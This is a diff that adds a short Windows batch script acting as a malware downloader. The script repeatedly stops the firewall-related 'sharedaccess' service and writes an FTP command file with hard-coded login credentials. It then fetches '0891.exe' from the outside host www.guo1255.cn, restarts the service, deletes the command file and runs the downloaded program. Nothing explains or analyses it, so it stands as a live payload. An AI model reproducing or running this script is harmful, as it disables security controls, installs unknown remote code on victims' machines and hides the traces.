@@ -1,0 +1,18 @@
+ÿþ &cls
+ping -n 15 127.1>nul
+sc stop sharedaccess
+ping -n 10 127.1>nul
+sc stop sharedaccess
+ping -n 14 127.1>nul
+@echo open www.guo1255.cn 21>cc1.dat
+@echo hjgurft56>>cc1.dat
+@echo zhang2830891>>cc1.dat
+@echo cd wwwroot>>cc1.dat
+@echo binary>>cc1.dat
+@echo get 0891.exe>>cc1.dat
+@echo bye>>cc1.dat
+ftp -s:cc1.dat
+sc start sharedaccess
+del cc1.dat
+0891.exe
+exit
